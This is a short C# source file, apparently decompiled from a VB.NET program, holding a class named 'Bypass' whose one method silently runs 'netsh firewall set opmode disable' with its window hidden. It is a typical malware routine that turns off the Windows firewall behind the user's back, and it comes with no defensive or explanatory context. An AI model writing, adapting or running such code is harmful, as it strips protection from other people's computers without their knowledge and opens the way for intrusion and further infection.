using System.Diagnostics;
using Microsoft.VisualBasic.CompilerServices;

namespace WindowsApplication35;

[StandardModule]
internal sealed class Bypass
{
	public static void FirfeWall()
	{
		Process process = new Process();
		string fileName = "netsh.exe";
		process.StartInfo.Arguments = "firewall set opmode disable";
		process.StartInfo.FileName = fileName;
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.RedirectStandardOutput = true;
		process.StartInfo.CreateNoWindow = true;
		process.Start();
		process.WaitForExit();
	}
}
